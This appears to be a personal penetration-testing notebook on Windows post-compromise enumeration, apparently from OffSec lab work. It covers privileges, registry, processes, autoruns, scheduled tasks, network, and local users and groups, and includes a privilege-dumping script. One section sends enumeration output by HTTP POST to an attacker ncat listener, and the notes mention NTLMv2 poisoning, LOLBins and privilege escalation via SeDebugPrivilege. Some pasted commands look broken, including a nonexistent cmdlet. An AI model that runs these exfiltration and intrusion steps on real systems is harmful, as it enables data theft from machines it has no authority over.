#windows-info 


## To list all the priviledge of current user  we can use a simple command 

`whoami /priv`

`whoami /groups`

- the currently logged in user priviledge 

## Another technique or cmdlet which allows you to get information without admin rights :

- using /z will allow us to get super verbose output with gpresult 
```powershell
gpresult
```

## Data from registary which can be helpfull

```powershell
reg query  "HKLM\SOFTWARE\Policies\MICROSOFT" /s /z
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies
```

## Running powershell as another user 

```powershell
start-process -filepath path-to-power-OR-cmd -verb RunAsUser

make surre you have password , use net-ntlmv2 poinsioning technique or initial foothold
```
- this will prompt for username and password for that user 
- another technique is to use pscredential object and passing the password as secure string very tedious work to do 
- if powershell is somewhere else find that start the process 
```powershell
#the executable of powershell is needed 
#by default we can find it in 
C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
there can be different route or path too where we can find powershell 
use = gci -path C:\ -include powershell.exe -recurse - erroraction silentlycontinue

----------------------------------------------------------------------------------------------------------------
gci -path C:\ -include powershell.exe -recurse -erroraction SilentlyContinue


C:\Windows\System32\WindowsPowerShell\v1.0                                                                                                                                                                   C:\Windows\SysWOW64\WindowsPowerShell\v1.0
C:\Windows\WinSxS\amd64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.20348.1_none_f284fc37cb3939fd                                                 C:\Windows\WinSxS\wow64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.20348.1_none_fcd9a689ff99fbf8

$psversiontable
```
## Running Services and Process ``

```powershell
wmic service list brief

get-process -name program_name 
#we can use pid like we can enumerate all the tcp pid and there modules if loaded and what process they are 

Get-NetTCPConnection, Get-NetUDPEndpoint | 
    Select-Object -ExpandProperty OwningProcess | 
    Sort-Object -Unique | 
    ForEach-Object { Get-Process -Id $_ -IncludeUserName -ErrorAction SilentlyContinue }

finding all the pid related to tcp connections and what process are running on those pid by which user

get-process -module -fileversioninfo

this will print the version of dll and module loaded , juicy info

get-process | select-object name,path,Description,Company,InternalName | findstr /s /v "Microsoft Corporation
non-standard process ,needs more refinery 

or
get-process | select-object name,path,Description,Company | findstr /s /v /i "C:\Windows\system32" | findstr /v "svchost"
more precise 

i found all the backdoor which are implemented by offsec via the command 
get-process -processname backdoor*

there is also another cmdlet which can be very usefull 
debug-process 

```

**Data exfilteration technique** 

> [!PILLAGING or Data exfilteration]
> [[Windows File Transfer Methods#PowerShell Upload File]]


## Autostart locations AND Binary 

```powershell
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

## Scheduled tasks 

the below command can be used via encoding bcz it will be a mess 
```powershell
schtasks /query /fo LIST /v
$enum = schtasks /query /fo LIST /v 
invoke-webrequest -uri http://ip:port -method POST -body $enum 

#####attackermachine##########
ncat -lk 4444

```

## Network Interfaces and Routes 

```powershell
ipconfig /all
route print
arp -a
netstat -ano
```

## Logged-in User

```powershell
query user
query session
qwinsta
```

## shared folders 

```powershell
net share
```

## Installed software

```powershell
wmic product get name,version

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

=>Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
=for 64bit

=>Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
=for 32 bit

for detailed information , use get-itemproperty or wmic 
**Why:** Identify attack surface (apps with known vulns).```

---
### 🎁 BONUS: LOLBAS usage examples (LOLBins)

- **Use built-in binaries (LOLBAS) to do some of this**

## schtasks → scheduled tasks (LOLBAS)

`schtasks /query /fo LIST /v`

## reg.exe → query registry (LOLBAS)

`reg query HKLM\SOFTWARE\Policies`

## net.exe → user/group info (LOLBAS)

`net user net localgroup`

## sc.exe → services (LOLBAS)

`sc query type= service state= all`

## wmic.exe → various info (LOLBAS)

`wmic service list brief wmic useraccount get name,sid,status wmic group get name,sid`

## cmd.exe → launch all this → can script this as batch

---
### 1. **List All Local Groups**

To list all local groups on the machine:

`Get-LocalGroup`

### 2. **List All Local Users**

To list all local users on the machine:

`Get-LocalUser`

### 3. **List Members of a Specific Local Group**

To find out which users are members of a specific local group (replace `"GroupName"` with the actual group name):

`Get-LocalGroupMember -Group "GroupName"`

### 4. **List All Groups a Specific Local User Belongs To**

To find out which groups a specific local user (replace `"username"` with the actual username) is a member of:

`Get-LocalUser -Name "username" | Get-LocalGroupMembership`  ****

### 5. **List All Groups and Their Members**

To get a list of all local groups and their members, you can use a combination of commands in a script-like manner:

1. **List All Local Groups**:
    
    `$groups = Get-LocalGroup`
    
2. **List Members of Each Group**:
       
    `foreach ($group in $groups) {     Write-Output "$($group.Name):"     Get-LocalGroupMember -Group $group.Name | Select-Object Name     Write-Output "" }`
    

### Summary

- **List All Local Groups**: `Get-LocalGroup`
- **List All Local Users**: `Get-LocalUser`
- **List Members of a Specific Local Group**: `Get-LocalGroupMember -Group "GroupName"`
- **List Groups for a Specific Local User**: `Get-LocalUser -Name "username" | Get-LocalGroupMembership`
- **List All Groups and Their Members** (Two-step process):
    - `Get-LocalGroup`
    - `foreach ($group in $groups) { Get-LocalGroupMember -Group $group.Name | Select-Object Name }`


## script to automate the enumeration of Privilege for each user (must be run as admin)
```powershell
# Define path to export Security Policy
$SecPolPath = "C:\Temp\SecPol.inf"

# Ensure target directory exists
if (!(Test-Path "C:\Temp")) {
    New-Item -ItemType Directory -Path "C:\Temp" | Out-Null
}

# Export current local security policy
Write-Host "Exporting Local Security Policy..."
secedit /export /cfg $SecPolPath | Out-Null

# Read the INF file
$SecPolLines = Get-Content -Path $SecPolPath

# Define regex to match privilege assignments
$PrivRegex = '^Se\S+Privilege\s*=\s*(.*)'

# Initialize output object
$PrivTable = @{}

# Process each line
foreach ($line in $SecPolLines) {
    if ($line -match $PrivRegex) {
        $privName = $line.Split('=')[0].Trim()
        $sidList = $line.Split('=')[1].Trim() -split ','

        $resolvedAccounts = @()
        foreach ($sidRaw in $sidList) {
            $sidStr = $sidRaw.Trim()

            # Some policies may have no assignments
            if ($sidStr -eq "") {
                continue
            }

            try {
                $sidObj = New-Object System.Security.Principal.SecurityIdentifier($sidStr)
                $account = $sidObj.Translate([System.Security.Principal.NTAccount])
                $resolvedAccounts += $account.Value
            } catch {
                # If SID translation fails, just include the raw SID
                $resolvedAccounts += $sidStr
            }
        }

        # Store in output table
        $PrivTable[$privName] = $resolvedAccounts
    }
}

# Print results
Write-Host "`n--- User Rights Assignment (Privileges) ---`n"

foreach ($priv in $PrivTable.Keys) {
    Write-Host "$($priv):"
    foreach ($acct in $PrivTable[$priv]) {
        Write-Host "$(    $acct)"
    }
    Write-Host ""
}

# Cleanup
# Remove-Item $SecPolPath -Force
```
**note=>we need to know sometimes that certian user have certian or specific permissions to do a task these are called priviledges assigned to each user , SEdebugpolicy can give you access to inject a process into another users context or elevatethe privledge **

### 1. **List All Local Groups**

To list all local groups on the machine:

`net localgroup`

### 2. **List All Local Users OR specific user **

To list all local users on the machine:

`net user` or `net user <username>`

### 3. **List Members of a Specific Local Group**

To find out which users are members of a specific local group (replace `"GroupName"` with the actual group name):

cmd

Copy code

`net localgroup "GroupName"`

### 4. **List All Groups a Specific Local User Belongs To**

The `net` command does not provide a direct way to list all groups a specific user belongs to. You would typically use PowerShell for this. However, you can check the group membership indirectly by using the following PowerShell script if you prefer a command-line approach:

powershell

Copy code

`$user = "username" $groups = net user $user | Select-String "Group membership" | ForEach-Object { $_.Line } $groups`

Replace `"username"` with the actual user name.

### Summary

- **List All Local Groups**: `net localgroup`
- **List All Local Users**: `net user`
- **List Members of a Specific Local Group**: `net localgroup "GroupName"`
- **List Groups for a Specific Local User**: `net user "username"`